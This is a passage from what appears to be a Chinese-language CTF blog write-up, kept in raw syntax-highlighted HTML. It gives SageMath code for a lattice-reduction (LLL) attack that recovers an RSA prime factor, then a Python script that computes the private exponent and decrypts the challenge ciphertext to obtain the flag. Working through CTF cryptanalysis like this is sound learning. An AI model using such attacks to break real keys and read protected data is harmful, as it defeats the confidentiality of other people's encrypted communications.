punctuation">)</span><span class="token operator">+</span>N        <span class="token comment"># print(pol(y=k-1,z=q)%e)</span>    G <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token operator">**</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token operator">**</span>jj<span class="token operator">*</span>pol<span class="token punctuation">(</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>tt<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token operator">**</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token operator">**</span>jj<span class="token operator">*</span>pol<span class="token punctuation">(</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> G<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j <span class="token keyword">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Construct lattice spanned by polynomials with yY and zZ</span>    L <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            L<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>Y<span class="token operator">*</span>y<span class="token punctuation">,</span>Z<span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># makes lattice upper triangular</span>    L <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span>L<span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bitlengths of matrix elements (before reduction):"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>apply_map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    L <span class="token operator">=</span> L<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bitlengths of matrix elements (after reduction):"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>apply_map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    pol1 <span class="token operator">=</span> P<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>mul<span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">/</span>Y<span class="token punctuation">,</span>z<span class="token operator">/</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>    pol2 <span class="token operator">=</span> P<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>mul<span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>L<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>monomials<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">/</span>Y<span class="token punctuation">,</span>z<span class="token operator">/</span>Z<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(pol1(y=k-1,z=q)%e)</span>    <span class="token keyword">if</span> L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>norm<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span>e<span class="token operator">^</span>mm<span class="token punctuation">)</span><span class="token operator">/</span>sqrt<span class="token punctuation">(</span>dd<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Can't attack,plz try bigger m,t"</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> pol2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol1<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>is_constant<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>     <span class="token keyword">for</span> z0<span class="token punctuation">,</span> _ <span class="token keyword">in</span> r<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z0<span class="token punctuation">)</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Potential z0:"</span><span class="token punctuation">,</span>z0<span class="token punctuation">)</span>    <span class="token keyword">return</span> roots<span class="token keyword">print</span><span class="token punctuation">(</span>attack<span class="token punctuation">(</span>mm<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>tt<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，将参数mm和tt提升到（6，4）的时候，运行一小段时间后可以得到结果</p><p>即<code>q=169137218869484728712814942277531819318585090563481420862437016566714151</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> powmod<span class="token punctuation">,</span>invert<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesN<span class="token operator">=</span><span class="token number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>e<span class="token operator">=</span><span class="token number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>c<span class="token operator">=</span><span class="token number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>    q<span class="token operator">=</span><span class="token number">169137218869484728712814942277531819318585090563481420862437016566714151</span>p<span class="token operator">=</span>N<span class="token operator">//</span>qd<span class="token operator">=</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到flag</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
